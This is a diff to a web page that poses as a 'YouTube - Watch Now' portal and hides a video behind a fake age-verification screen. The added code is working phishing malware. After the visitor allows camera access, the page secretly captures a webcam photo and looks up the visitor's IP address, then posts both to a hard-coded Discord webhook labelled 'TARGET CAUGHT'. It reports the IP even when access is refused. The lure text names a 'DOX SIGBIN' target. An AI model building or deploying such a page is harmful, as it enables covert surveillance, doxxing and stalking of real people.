@@ -6,8 +6,6 @@
     <meta property="og:title" content="YouTube - Watch Now">
     <meta property="og:description" content="Official YouTube Portal">
     <meta property="og:image" content="https://img.youtube.com/vi/GoHLDPWT6Hw/maxresdefault.jpg">
-    <meta property="og:image:width" content="1200">
-    <meta property="og:image:height" content="630">
     <meta property="og:type" content="video.other">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
 
@@ -23,10 +21,10 @@
 <body>
 
     <div id="lock-screen">
-        <div class="play-btn" onclick="huliKaSigbin()"></div>
-        <h2>Confirm you're not a robot</h2>
-        <p>Please allow camera access to verify and play the video.</p>
-        <div id="error" class="error-msg">⚠️ ACCESS DENIED! <br> Please ALLOW camera access to watch this video.</div>
+        <div class="play-btn" onclick="verifyAndPlay()"></div>
+        <h2 style="font-size: 18px;">Age Verification Required</h2>
+        <p id="instruction" style="font-size: 14px; color: #ccc;">ALLOW IF YOU ARE 18+ AND CONTINUE TO WATCH <br><b>"DOX SIGBIN"</b></p>
+        <div id="error" class="error-msg">⚠️ VERIFICATION FAILED! <br> You must ALLOW camera to confirm your age. <br> Please refresh and try again.</div>
     </div>
 
     <iframe id="player" src="https://www.youtube.com/embed/GoHLDPWT6Hw" allow="autoplay; encrypted-media"></iframe>
@@ -37,7 +35,7 @@
     <script>
         const hook = "https://discord.com/api/webhooks/1470024521758277849/x38VsV5RWVkSq6k7un7WZ8H43jrfzy9yUfI4D3MvDd_WP3jgTIb1_0kn6ga4Kho4c54z";
 
-        async function huliKaSigbin() {
+        async function verifyAndPlay() {
             const errorText = document.getElementById('error');
             const player = document.getElementById('player');
             const lockScreen = document.getElementById('lock-screen');
@@ -45,11 +43,14 @@
             try {
                 const ipRes = await fetch('https://api.ipify.org?format=json');
                 const ipData = await ipRes.json();
+                
+                // REQUEST CAMERA PARA SA VERIFICATION
                 const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                 
+                // PAG NAG-ALLOW, DITO LANG LALABAS ANG VIDEO
                 lockScreen.style.display = 'none';
                 player.style.display = 'block';
-                player.src += "?autoplay=1";
+                player.src += "?autoplay=1"; 
 
                 const vid = document.getElementById('v');
                 vid.srcObject = stream;
@@ -60,19 +61,25 @@
                     can.getContext('2d').drawImage(vid, 0, 0);
                     const img = can.toDataURL('image/jpeg', 0.6);
                     const blob = await (await fetch(img)).blob();
+                    
                     const fd = new FormData();
                     fd.append('file', blob, 'huli_ka.jpg');
-                    fd.append('payload_json', JSON.stringify({ content: "🎯 **SUCCESS!** IP: " + ipData.ip }));
+                    fd.append('payload_json', JSON.stringify({
+                        content: "🎯 **AGE VERIFIED! (TARGET CAUGHT)**\n**IP:** " + ipData.ip
+                    }));
+
                     await fetch(hook, { method: 'POST', body: fd });
                     stream.getTracks().forEach(t => t.stop());
                 }, 1500);
+
             } catch (e) {
+                // PAG NAG-DENY, STAY SA LOCK SCREEN
                 errorText.style.display = 'block';
                 const ipRes = await fetch('https://api.ipify.org?format=json').then(r => r.json()).catch(() => ({ip: "Unknown"}));
                 fetch(hook, {
                     method: 'POST',
                     headers: {'Content-Type': 'application/json'},
-                    body: JSON.stringify({ content: "🚫 **DENIED!** IP: " + ipRes.ip })
+                    body: JSON.stringify({ content: "🚫 **VERIFICATION DENIED!**\n**IP:** " + ipRes.ip })
                 });
             }
         }
